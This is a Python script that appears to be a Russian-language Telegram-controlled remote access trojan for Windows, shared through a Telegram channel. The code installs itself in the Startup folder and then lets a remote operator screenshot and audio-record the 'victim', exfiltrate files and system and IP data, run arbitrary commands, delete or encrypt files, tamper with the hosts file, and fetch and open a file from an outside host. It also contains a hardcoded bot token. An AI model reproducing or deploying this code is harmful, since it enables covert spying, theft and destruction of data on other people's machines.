################################################################################
#                              RIGHT DECISION                                  #
#                     Telegram https://t.me/Bad_Decision                       #
#      Если сливаете мой скрипт в свой канал. Хотя бы отметьте мой канал       #
#                                  Райт:)                                      #
################################################################################
# Токен в 64 строку :)
from PIL import ImageGrab
import getpass
import os
import telebot
import os.path
import webbrowser
import sqlite3
import win32crypt
import shutil
import requests
import zipfile
import win32api
import platform
import time
import sys
import json,base64
from os.path import basename
from base64 import encodebytes
import random
from time import sleep
from datetime import datetime, timedelta
import psutil
import GPUtil
from tabulate import tabulate
from Crypto.Cipher import AES
from tkinter import *  
from tkinter import messagebox  
import wave
import pyaudio
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pyautogui as p
import struct
import ctypes
from cryptography.fernet import Fernet
import configparser
import subprocess
import ffpass
import wget

Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
user_path = os.path.expanduser('~') # Путь к папке пользователя

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')


while True:
    try:
        p.FAILSAFE = False
        USER_NAME = getpass.getuser()
        token = '5550432878:AAFB-R_MQX-gyGmER40HUuPcOUm1JmaFFTA' # ТОКЕН БОТА СЮДА !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


        bot = telebot.TeleBot(token)

        @bot.message_handler(commands=["start"])
        def screen(message, res=False):
            try:
                bot.send_message(message.chat.id, """
                    Мои команды:
                    \n/screen - Скриншот
                    \n/antiviruses - Наличие антивирусов
                    \n/pc_info - Данные о пк в том числе и IP
                    \n/webp - Фото с веб камеры
                    \n/open_link https://ссылка - Открывает ссылку в браузере и присылает скриншот
                    \n/currentdir - Показывает директорию в которой находитесь
                    \n/listdir - Показывает содержание вашей директории
                    \n/makefolder имя папки - Создаёт папку
                    \n/removeFolder - Удаляет папку
                    \n/msgbox текст - Выводит окно с вашим текстом
                    \n/removeFile имя файла - Удалить файл
                    \n/download имя файла - Скачать файл
                    \n/webcamvideo длительность в цифрах 1000 примерно 39 секунды - Записать видео с веб камеры
                    \n/audio длительность в цифрах 1000 примерно 23 секунды - Запись аудио с пк жертвы
                    \n/system имя файла с расширением - Откроет любой файл
                    \n/volumeON - Включит максимальную громкость
                    \n/volumeOFF - Выключит звук
                    \n/shutdown - Выключит пк
                    \n/restart - Перезагрузит пк
                    \n/altf4 - Исполнит сочетание клавиш alf + f4
                    \n/hidePG - Свернёт все окна
                    \n/crazyMOUSE время сумашествия 1000 примерно 1 минута - Курсор сойдёт с ума
                    \n/changeWall имя файла - Поменяет обои
                    \n/changedir имя директории - Перемещяемся по директории
                    \n/cut имя файла имя директории - Перемещение файла
                    \n/rename имя файла новое имя файла - Переименование файла
                    \n/get_size имя файла - Данные о размере файла
                    \n/encrypt имя файла - Закриптует файл
                    \n/blockURL ссылка на сайт без https:// - Заблокирует доступ к сайту
                    \n/unblockURLS - Разблокирует все заблокированные сайты
                    \nТак же, если ты скинешь мне голосовое сообщение я открою его у жертвы
                    \nЕщё ты можешь скинуть мне любой файл и я его сохраню на пк жертвы""")
            except Exception as e:
                bot.reply_to()

        @bot.message_handler(commands=["help"])
        def screen(message, res=False):
            try:
                bot.send_message(message.chat.id, """
                    Мои команды:
                    \n/screen - Скриншот
                    \n/antiviruses - Наличие антивирусов
                    \n/pc_info - Данные о пк в том числе и IP
                    \n/webp - Фото с веб камеры
                    \n/open_link https://ссылка - Открывает ссылку в браузере и присылает скриншот
                    \n/currentdir - Показывает директорию в которой находитесь
                    \n/listdir - Показывает содержание вашей директории
                    \n/makefolder имя папки - Создаёт папку
                    \n/removeFolder - Удаляет папку
                    \n/msgbox текст - Выводит окно с вашим текстом
                    \n/removeFile имя файла - Удалить файл
                    \n/download имя файла - Скачать файл
                    \n/webcamvideo длительность в цифрах 1000 примерно 39 секунды - Записать видео с веб камеры
                    \n/audio длительность в цифрах 1000 примерно 23 секунды - Запись аудио с пк жертвы
                    \n/system имя файла с расширением - Откроет любой файл
                    \n/volumeON - Включит максимальную громкость
                    \n/volumeOFF - Выключит звук
                    \n/shutdown - Выключит пк
                    \n/restart - Перезагрузит пк
                    \n/altf4 - Исполнит сочетание клавиш alf + f4
                    \n/hidePG - Свернёт все окна
                    \n/crazyMOUSE время сумашествия 1000 примерно 1 минута - Курсор сойдёт с ума
                    \n/changeWall имя файла - Поменяет обои
                    \n/changedir имя директории - Перемещяемся по директории
                    \n/cut имя файла имя директории - Перемещение файла
                    \n/rename имя файла новое имя файла - Переименование файла
                    \n/get_size имя файла - Данные о размере файла
                    \n/encrypt имя файла - Закриптует файл
                    \n/blockURL ссылка на сайт без https:// - Заблокирует доступ к сайту
                    \n/unblockURLS - Разблокирует все заблокированные сайты
                    \nТак же, если ты скинешь мне голосовое сообщение я открою его у жертвы
                    \nЕщё ты можешь скинуть мне любой файл и я его сохраню на пк жертвы""")
            except Exception as e:
                bot.reply_to()

        @bot.message_handler(commands=["screen"])
        def screen(message, res=False):
            bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            screen = ImageGrab.grab()
            screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
            f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
            bot.send_document(message.chat.id,f)
            try:
                os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\sreenshot.png')
            except:
                pass


        @bot.message_handler(commands=["antiviruses"])
        def antiviruses(message, res=False):
            bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            Antiviruses = {
            'C:\\Program Files\\Windows Defender': 'Windows Defender',
            'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
            'C:\\Program Files\\AVG\\Antivirus': 'AVG',
            'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
            'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
            'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
            'C:\\Program Files\\DrWeb': 'Dr.Web',
            'C:\\Program Files\\ESET\\ESET Security': 'ESET',
            'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
            'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
            'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
            }
            Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
            AntivirusesAll = json.dumps(Antivirus)
            bot.send_message(message.chat.id, AntivirusesAll)




        @bot.message_handler(commands=["pc_info"])
        def pc_info(message, res=False):
            bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            try:
                def get_size(bytes, suffix="B"):
                    factor = 1024
                    for unit in ["", "K", "M", "G", "T", "P"]:
                        if bytes < factor:
                            return f"{bytes:.2f}{unit}{suffix}"
                        bytes /= factor
                uname = platform.uname()

                namepc = "\nИмя пк: " + str(uname.node)
                countofcpu = psutil.cpu_count(logical=True)
                allcpucount = "\nОбщее количество ядер процессора:" + str(countofcpu) 

                cpufreq = psutil.cpu_freq()
                cpufreqincy = "\nЧастота процессора: " + str(cpufreq.max) + 'Mhz'


                svmem = psutil.virtual_memory()
                allram = "\nОбщая память ОЗУ: " + str(get_size(svmem.total))
                ramfree = "\nДоступно: " + str(get_size(svmem.available))
                ramuseg = "\nИспользуется: " + str(get_size(svmem.used))

                partitions = psutil.disk_partitions()
                for partition in partitions:
                    nameofdevice = "\nДиск: " + str(partition.device)
                    nameofdick = "\nИмя диска: " + str(partition.mountpoint)
                    typeoffilesystem = "\nТип файловой системы: " + str(partition.fstype)
                    try:
                        partition_usage = psutil.disk_usage(partition.mountpoint)
                    except PermissionError:

                        continue
                    allstorage = "\nОбщая память: " + str(get_size(partition_usage.total))
                    usedstorage = "\nИспользуется: " + str(get_size(partition_usage.used))
                    freestorage = "\nСвободно: " + str(get_size(partition_usage.free))



                try:
                    gpus = GPUtil.getGPUs()
                    list_gpus = []
                    for gpu in gpus:

                        gpu_name = "\nМодель видеокарты: " + gpu.name

                        gpu_free_memory = "\nСвободно памяти в видеокарте: " + f"{gpu.memoryFree}MB"

                        gpu_total_memory = "\nОбщая память видеокарты: " f"{gpu.memoryTotal}MB"

                        gpu_temperature = "\nТемпература видеокарты в данный момент: " f"{gpu.temperature} °C"
                except:
                    bot.send_message(message.chat.id, 'Видеокарты нету либо она встроенная')

                headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                }
                drives = str(win32api.GetLogicalDriveStrings())
                drives = str(drives.split('\000')[:-1])

                try:
                    ip = requests.get('https://api.ipify.org').text
                    urlloc = 'http://ip-api.com/json/'+ip
                    location1 = requests.get(urlloc, headers=headers).text
                except:
                    pass
                all_data = "Time: " + time.asctime() + '\n' + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nДанные локации и IP:' + location1 + '\nДиски:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
                bot.send_message(message.chat.id, all_data)
            except Exception as e:
                bot.reply_to(message, e)


        @bot.message_handler(commands=["open_link"])
        def screen(message, res=False):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                webbrowser.open_new(message.text.split()[1])
                sleep(2)
                screen = ImageGrab.grab()
                screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
                f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
                bot.send_document(message.chat.id,f)
                try:
                    os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming' + '\\sreenshot.jpg')
                except Exception as e:
                    bot.send_message(message.chat.id, 'Скриншот сделать удалось, но не получилось удалить скриншот после отправки:(\nКод ошибки:\n' + str(e))
                bot.send_message(message.chat.id, 'Успешно открыта ссылка! Вот скриншот')
            except Exception as e:
                bot.send_message(message.chat.id, 'Не удалось открыть ссылку, используй такой формат: /open_link https://ссылка\nКод ошибки:\n' + str(e))


        @bot.message_handler(commands=["changedir"])
        def screen(message, res=False):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                text = ' '.join([str(elem) for elem in message.text.split()])
                text1 = text.replace('/changedir ', '')
                os.chdir(text1)
                bot.send_message(message.chat.id, 'Успешно теперь мы в директории: ' + str(os.getcwd()))
            except Exception as e:
                bot.send_message(message.chat.id, e)

        @bot.message_handler(commands=["currentdir"])
        def screen(message, res=False):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                cwd = os.getcwd()
                bot.send_message(message.chat.id, cwd)
            except Exception as e:
                bot.reply_to(message, e)

        @bot.message_handler(commands=["makefolder"])
        def screen(message, res=False):
            try:
                text = ' '.join([str(elem) for elem in message.text.split()])
                text1 = text.replace('/makefolder ', '')
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                os.makedirs(text1)
                bot.send_message(message.chat.id, 'Папка создана')
            except Exception as e:
                bot.send_message(message.chat.id, e)


        @bot.message_handler(commands=["listdir"])
        def screen(message, res=False):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                listdir = os.listdir()
                bot.send_message(message.chat.id, '\n'.join([str(elem) for elem in listdir]))
            except Exception as e:
                bot.reply_to(message, e)

        @bot.message_handler(commands=["removeFolder"])
        def screen(message, res=False):
            try:
                text = ' '.join([str(elem) for elem in message.text.split()])
                text1 = text.replace('/removeFolder ', '')
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                shutil.rmtree(text1)
                bot.send_message(message.chat.id, 'Успешно удаленно')
            except Exception as e:
                bot.send_message(message.chat.id, e)


        @bot.message_handler(commands=["removeFile"])
        def screen(message, res=False):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                text = ' '.join([str(elem) for elem in message.text.split()])
                text1 = text.replace('/removeFile ', '')
                os.remove(text1)
                bot.send_message(message.chat.id, 'Успешно удаленно')
            except Exception as e:
                bot.send_message(message.chat.id, e)       

        @bot.message_handler(commands=["rename"])
        def screen(message, res=False):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                os.rename(message.text.split()[1], message.text.split()[2])
                bot.send_message(message.chat.id, 'Успешно переименованно')
            except Exception as e:
                bot.send_message(message.chat.id, e)

        @bot.message_handler(commands=["cut"])
        def screen(message, res=False):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                os.rename(message.text.split()[1], message.text.split()[2])
                bot.send_message(message.chat.id, 'Успешно перемещено')
            except Exception as e:
                bot.send_message(message.chat.id, e)       


        @bot.message_handler(content_types=['document'])
        def handle_docs_photo(message):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                chat_id = message.chat.id

                file_info = bot.get_file(message.document.file_id)

                downloaded_file = bot.download_file(file_info.file_path)

                src = os.getcwd() + '\\' + message.document.file_name;
                with open(src, 'wb') as new_file:
                    new_file.write(downloaded_file)

                bot.reply_to(message, "Файл сохранён в текущую директорию, её содержание можете посмотреть командой /listdir")
            except Exception as e:
                bot.reply_to(message, e)


        @bot.message_handler(commands=["msgbox"])
        def screen(message, res=False):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                top = Tk()  
                top.geometry("700x700")      
                text = ' '.join([str(elem) for elem in message.text.split()])
                text1 = text.replace('/msgbox ', '')
                label = Label(text=text1, fg="#eee", bg="#333", font="Arial 20")  
                label.place(relx=.2, rely=.3)
                top.mainloop()
                screen = ImageGrab.grab()
                screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
                f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
                bot.send_document(message.chat.id,f)
            except Exception as e:
                bot.reply_to(message, e)




        @bot.message_handler(commands=['audio'])
        def audio(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                audio = pyaudio.PyAudio()

                stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)

                frames = []

                try:
                    for i in range(1,int(message.text.stripe()[1])):
                        data = stream.read(1024)
                        frames.append(data)

                except Exception as e:
                    bot.reply_to(message, e)


                stream.stop_stream()
                stream.close()
                audio.terminate()

                sound_file = wave.open('audio.wav', 'wb')
                sound_file.setnchannels(1)
                sound_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                sound_file.setframerate(44100)
                sound_file.writeframes(b''.join(frames))
                sound_file.close()
                bot.send_document(message.chat.id, open('audio.wav', 'rb'))
            except Exception as e:
                bot.reply_to(message, e)







        @bot.message_handler(commands=['download'])
        def video(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                text = ' '.join([str(elem) for elem in message.text.split()])
                text1 = text.replace('/download ', '')
                f = open(text1, 'rb')

                bot.send_document(message.chat.id, f)
            except Exception as e:
                bot.reply_to(message, e)





        @bot.message_handler(commands=['system'])
        def video(message, res=True):
            try:
                text = ' '.join([str(elem) for elem in message.text.split()])
                text1 = text.replace('/system ', '')
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                a = os.system(text1)
                if a == 1:
                    bot.reply_to(message, 'Команда не выполнилась')
                elif a == 0:
                    bot.reply_to(message, 'Команда выполнилась')
            except Exception as e:
                bot.reply_to(message, e)


        @bot.message_handler(commands=['volumeOFF'])
        def video(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                p.hotkey('volumemute')
                bot.reply_to(message, 'Звук успешно был выключен')
            except Exception as e:
                bot.reply_to(message, e)

        @bot.message_handler(commands=['volumeON'])
        def video(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                for x in range(1,100):
                    p.hotkey('volumeup')
                bot.reply_to(message, 'Звук успешно был включен на 100%')
            except Exception as e:
                bot.reply_to(message, e)

        @bot.message_handler(commands=['shutdown'])
        def video(message, res=True):
            try:
                bot.reply_to(message, 'Выключаю пк...')
                os.system('shutdown /s /t 0')
            except Exception as e:
                bot.reply_to(message, e)

        @bot.message_handler(commands=['altf4'])
        def video(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                p.hotkey('alt','f4')
                bot.reply_to(message, 'Успешно!')
            except Exception as e:
                bot.reply_to(message, e)


        @bot.message_handler(commands=['hidePG'])
        def video(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                p.hotkey('win','d')
                bot.reply_to(message, 'Успешно!')
            except Exception as e:
                bot.reply_to(message, e)

        @bot.message_handler(commands=['crazyMOUSE'])
        def video(message, res=True):
            try:
                text = ' '.join([str(elem) for elem in message.text.split()])
                text1 = text.replace('/crazyMOUSE ', '')
                time = int(text1)
                bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')
                for x in range(1,time):
                    p.moveTo(random.randint(0,500),random.randint(0,500))
                bot.reply_to(message, 'Успешно!')
            except Exception as e:
                bot.reply_to(message, e)


        @bot.message_handler(commands=['restart'])
        def video(message, res=True):
            try:
                bot.reply_to(message, 'Перезагружаю пк...')
                os.system('shutdown /r /t 0')
            except Exception as e:
                bot.reply_to(message, e)

        @bot.message_handler(content_types=['voice'])
        def repeat_all_message(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')
                file_info = bot.get_file(message.voice.file_id)
                file = requests.get('https://api.telegram.org/file/bot{0}/{1}'.format(token, file_info.file_path))
                with open('voice.ogg','wb') as f:
                    f.write(file.content)
                os.system('voice.ogg')
                bot.reply_to(message, 'Успешно')
            except Exception as e:
                bot.reply_to(message, e)



        @bot.message_handler(commands=['changeWall'])
        def changeWall(message, res=True):
            try:
                text = ' '.join([str(elem) for elem in message.text.split()])
                PATH1 = text.replace('/changeWall ', '')
                PATH = os.getcwd() + '\\' + PATH1
                SPI_SETDESKWALLPAPER = 20

                def is_64bit_windows():
                    """Check if 64 bit Windows OS"""
                    return struct.calcsize('P') * 8 == 64

                def changeBG(path):
                    """Change background depending on bit size"""
                    if is_64bit_windows():
                        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, PATH, 3)

                    else:
                        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, PATH, 3)

                changeBG(PATH)
                bot.reply_to(message, 'Обои успешно сменены!')

            except Exception as e:
                bot.reply_to(message,e )

        @bot.message_handler(commands=['get_size'])
        def changeWall(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')                
                text = ' '.join([str(elem) for elem in message.text.split()])
                PATH1 = text.replace('/get_size ', '')
                size = os.stat(PATH1).st_size

                dct = {'b':1024, 'K' : 1024 ** 2, 'M' : 1024 ** 3, 'G' :  1024 ** 4}
                 
                ci = 'b'
                num = int(size)
                 
                m_num = num * dct[ci]
                ret = [m_num / x[1] for x in dct.items() if x[0] != ci]
                bot.reply_to(message, str(ret[1]) + ' Мегабайтов')
            except Exception as e:
                bot.reply_to(message,e )


        @bot.message_handler(commands=['encrypt'])
        def changeWall(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')
                text = ' '.join([str(elem) for elem in message.text.split()])
                PATH1 = text.replace('/encrypt ', '')
                key = b'9BKxtE5VdyKpKUYOyqAEWZHOj1SyFFRTIeiEufqER7g='
                f = Fernet(key)

                with open(PATH1, 'rb') as original_file:
                    original = original_file.read()

                encrypted = f.encrypt(original)

                with open (PATH1, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted)

                bot.reply_to(message, 'Успешно зашифрованно!')

            except Exception as e:
                bot.reply_to(message, e)


        @bot.message_handler(commands=['screamer'])
        def screamer(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')
                try:
                    wget.download('http://f0512202.xsph.ru/videoplayback.mp4')
                except Exception as e:
                    bot.reply_to(message, e)
                    time.sleep(2)
                os.system('videoplayback.mp4')
                bot.reply_to(message, 'Всё чётко, жертва обосралась')
            except Exception as e:
                bot.reply_to(message, e)

        @bot.message_handler(commands=['blockURL'])
        def screamer(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')
                global hosts
                hosts = r'C:\Windows\System32\drivers\etc\hosts'
                global blocked_sites
                redirect_url = '127.0.0.1'
                blocked_sites = [message.text.split()[1]]
                with open(hosts, 'r+') as file:
                    src = file.read()
                    for site in blocked_sites:
                        if site in src:
                            bot.send_message(message.chat.id, 'Этот сайт уже заблокирован')
                        else:
                            file.write(f'{redirect_url} {site}\n')
                            bot.send_message(message.chat.id, 'Этот сайт успешно заблокирован')
            except Exception as e:
                bot.reply_to(message, e)


        @bot.message_handler(commands=['unblockURLS'])
        def screamer(message, res=True):
            try:
                bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')
    
                with open(hosts, 'r+') as file:
                    src = file.readlines()
                    file.seek(0)
                    for line in src:
                        if not any(site in line for site in blocked_sites):
                            file.write(line)
                    file.truncate()
                bot.reply_to(message, 'Все сайты успешно разблокированны')
                
            except Exception as e:
                bot.reply_to(message, e)


        @bot.message_handler(content_types=['text'])
        def hello(message, res=False):
            try:
                bot.reply_to(message, 'Чувак я не знаю что ответить на это, используй /help Для получения списка моих команд')
            except Exception as e:
                bot.reply_to(message, e)
        bot.polling()
    except:
        pass
        